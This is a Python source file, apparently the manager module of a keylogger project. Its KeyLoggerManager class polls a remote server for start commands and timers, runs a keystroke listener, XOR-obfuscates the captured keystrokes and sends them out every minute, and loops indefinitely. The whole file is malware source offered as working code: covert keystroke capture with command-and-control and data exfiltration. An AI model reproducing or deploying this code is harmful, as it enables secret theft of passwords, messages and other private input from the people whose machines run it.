import time
import threading
from send_ping import SendPing
from send_data import SendData
from key_logger_service import KeyLoggerService
from update_status import UpdateStatus
from encrypt import Encryption


class KeyLoggerManager:

    def __init__(self):
        self.service = KeyLoggerService()


    def start_key_logger(self):
        self.service.start_listener()
        generator = self.service.send_every_minute()
        for data in generator:
            encrypted_data = Encryption(data).xor_encryption()
            data = {"data": encrypted_data}
            server_commend = SendData().writing(data)
            if not server_commend:
                self.service.stop_listener()
                return False

    def start_keyLogger_timer(self, timer):
        self.service.start_listener()
        self.timer = threading.Timer(timer * 60, self.stop_listener_safely)
        self.timer.start()
        
        generator = self.service.send_every_minute()
        for data in generator:
            encrypted_data = Encryption(data).xor_encryption()
            data = {"data": encrypted_data}
            commend, new_timer = SendData().writing(data)
            
            if new_timer != timer:
                self.service.stop_listener()
                return False
            if self.service.stop_event.is_set():
                return False
    
    def stop_listener_safely(self):
        with self.service.lock:
            if self.service.key_buffer:
                encrypted_data = Encryption(self.service.key_buffer).xor_encryption()
                data = {"data": encrypted_data}
                SendData().writing(data)
                self.service.clean_buffer()
            UpdateStatus().update_status_and_timer()
        self.service.stop_listener()
           


    def start(self):
        is_listening = False
        while True:
            if not is_listening:
                try:
                    commend_to_start, timer = SendPing().send()
                    if timer > 0:
                        is_listening = self.start_keyLogger_timer(timer)
                    elif commend_to_start:
                        is_listening = self.start_key_logger()
                    else:
                        time.sleep(60) 
                except Exception as e:
                    print('Error in manager: ', e) 
                    time.sleep(60)
                    
        
if __name__ == "__main__":
    manager = KeyLoggerManager()
    manager.start()
